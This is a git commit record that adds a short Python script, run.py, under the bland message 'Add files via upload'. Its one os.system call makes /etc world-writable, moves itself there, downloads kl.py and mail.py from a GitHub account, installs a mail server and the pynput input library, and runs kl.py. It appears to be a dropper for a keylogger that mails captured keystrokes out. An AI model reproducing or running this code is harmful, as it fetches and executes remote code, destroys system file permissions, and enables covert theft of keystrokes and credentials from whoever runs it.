2b09c45b32c2ddd5a4c7bea6a40dfe04bd18259f
katerin966 <72075504+katerin966@users.noreply.github.com>
2021-02-24 12:45:35 +0000

    Add files via upload

---
+++ run.py
@@ -0,0 +1,3 @@
+import os
+
+os.system('sudo chmod 777 /etc/ && mv run.py /etc/ && cd && cd /etc/ && wget https://raw.githubusercontent.com/katerin966/0/main/kl.py && wget https://raw.githubusercontent.com/katerin966/0/main/mail.py && sudo apt update && sudo apt install postfix && sudo apt install bsd-mailx && sudo service postfix start && sudo apt install python3-pip && pip3 install pynput && pip3 install logging && python3 kl.py')
